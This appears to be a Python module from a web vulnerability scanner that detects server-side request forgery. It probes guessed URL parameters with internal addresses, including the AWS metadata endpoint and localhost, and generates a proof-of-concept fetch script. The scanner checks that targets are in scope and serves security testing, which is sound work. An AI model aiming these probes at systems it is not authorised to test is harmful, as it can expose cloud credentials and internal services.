"""SSRF (Server-Side Request Forgery) detector.

Finds URL-fetching endpoints and validates whether user-controlled input
reaches server-side requests without proper filtering.
"""
from __future__ import annotations

import time
from typing import Any
from urllib.parse import urlparse

import httpx

from ..core import (
    Evidence,
    Finding,
    HttpRequest,
    HttpResponse,
    ScanTarget,
    Severity,
    VulnType,
    _next_finding_id,
)
from ..llm import LLMClient


class SSRFModule:
    """Detect SSRF by probing URL parameters with internal addresses."""

    name = "ssrf"
    description = "Server-Side Request Forgery via unvalidated URL parameters"

    def __init__(self, client: httpx.Client | None = None, llm: LLMClient | None = None):
        self.client = client or httpx.Client(timeout=15.0, follow_redirects=True)
        self.llm = llm or LLMClient()

    def run(self, target: ScanTarget) -> list[Finding]:
        """Run SSRF detection against the target."""
        findings = []

        # Discover URL-fetching endpoints
        endpoints = self._discover_endpoints(target)
        for endpoint in endpoints:
            finding = self._test_endpoint(target, endpoint)
            if finding:
                findings.append(finding)

        return findings

    def _discover_endpoints(self, target: ScanTarget) -> list[dict[str, str]]:
        """Find endpoints that might fetch URLs."""
        candidates = []

        # Common SSRF-prone patterns
        url_params = ["url", "uri", "link", "src", "href", "fetch", "proxy",
                      "callback", "redirect", "next", "target", "endpoint"]

        # Try root-level API patterns
        common_paths = ["/api/fetch", "/api/proxy", "/api/webhook", "/api/check",
                        "/api/url", "/api/v1/fetch", "/api/v1/proxy",
                        "/health", "/status"]

        for path in common_paths:
            full_url = f"{target.url.rstrip('/')}{path}"
            if target.is_in_scope(full_url):
                for param in url_params:
                    candidates.append({"url": full_url, "param": param})

        return candidates

    def _test_endpoint(self, target: ScanTarget, endpoint: dict[str, str]) -> Finding | None:
        """Test a single endpoint for SSRF vulnerability."""
        url = endpoint["url"]
        param = endpoint["param"]

        # First, test with a benign URL to see if the endpoint fetches
        # Use a non-external probe (avoids network dependency and privacy issues)
        parsed_target = urlparse(target.url)
        benign_url = f"{parsed_target.scheme}://{parsed_target.hostname}/"
        benign_response = self._try_fetch(url, param, benign_url)

        if benign_response is None:
            return None

        # Now test with internal addresses
        internal_probes = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://127.0.0.1/",  # Localhost
            "http://[::1]/",  # IPv6 localhost
            "http://internal.local/",  # Internal DNS
        ]

        for internal_url in internal_probes:
            response = self._try_fetch(url, param, internal_url)
            if response is not None:
                if response.status_code == 200 and self._looks_like_internal_content(response):
                    evidence = Evidence(
                        finding_id=_next_finding_id("SSRF"),
                        title=f"SSRF via {param} parameter",
                        description=f"Endpoint at {url} fetches user-supplied URLs and "
                                    f"successfully retrieved internal resource at {internal_url}",
                        request=HttpRequest(method="GET", url=f"{url}?{param}={internal_url}"),
                        response=response,
                        proof_script=self._generate_poc_script(url, param, internal_url),
                        metadata={"internal_target": internal_url},
                    )
                    return Finding(
                        id=evidence.finding_id,
                        type=VulnType.SSRF,
                        severity=Severity.HIGH,
                        endpoint=url,
                        parameter=param,
                        summary=f"Server fetches user-supplied URLs without validation. "
                                f"Successfully reached {internal_url}.",
                        confidence=0.88,
                        evidence=evidence,
                    )

        # Even if internal fetch didn't work, the endpoint accepts arbitrary URLs
        if benign_response.status_code == 200:
            evidence = Evidence(
                finding_id=_next_finding_id("SSRF"),
                title=f"Potential SSRF via {param} parameter",
                description=f"Endpoint at {url} accepts arbitrary URLs for server-side fetching. "
                            f"Returned {benign_response.status_code} for benign URL.",
                request=HttpRequest(method="GET", url=f"{url}?{param}={benign_url}"),
                response=benign_response,
                proof_script=self._generate_poc_script(url, param, benign_url),
            )
            return Finding(
                id=evidence.finding_id,
                type=VulnType.SSRF,
                severity=Severity.MEDIUM,
                endpoint=url,
                parameter=param,
                summary=f"Endpoint fetches user-supplied URLs. Benign fetch returned {benign_response.status_code}.",
                confidence=0.72,
                evidence=evidence,
            )

        return None

    def _try_fetch(self, base_url: str, param: str, target_url: str) -> HttpResponse | None:
        """Attempt to trigger a server-side fetch."""
        try:
            start = time.time()
            resp = self.client.get(base_url, params={param: target_url})
            elapsed_ms = (time.time() - start) * 1000
            return HttpResponse(
                status_code=resp.status_code,
                headers=dict(resp.headers),
                body=resp.text[:2000],  # Cap body size
                response_time_ms=elapsed_ms,
            )
        except (httpx.RequestError, httpx.TimeoutException):
            return None

    @staticmethod
    def _looks_like_internal_content(response: HttpResponse) -> bool:
        """Heuristic: does the response look like internal service content?"""
        body_lower = response.body.lower()
        indicators = [
            "ami-", "instance-id", "instance-type",  # AWS metadata
            "hostname", "os", "kernel",  # Generic internal
            "server:", "x-powered-by:",  # Server info leaked
        ]
        return any(ind in body_lower for ind in indicators)

    @staticmethod
    def _generate_poc_script(base_url: str, param: str, target: str) -> str:
        return f"""#!/usr/bin/env python3
\"\"\"SSRF PoC: Fetch internal resource via {param} parameter.\"\"\"
import requests

url = "{base_url}"
params = {{"{param}": "{target}"}}

response = requests.get(url, params=params, timeout=10)
print(f"Status: {{response.status_code}}")
print(f"Body (first 500 chars): {{response.text[:500]}}")
# If this returns content from {target}, SSRF is confirmed.
"""
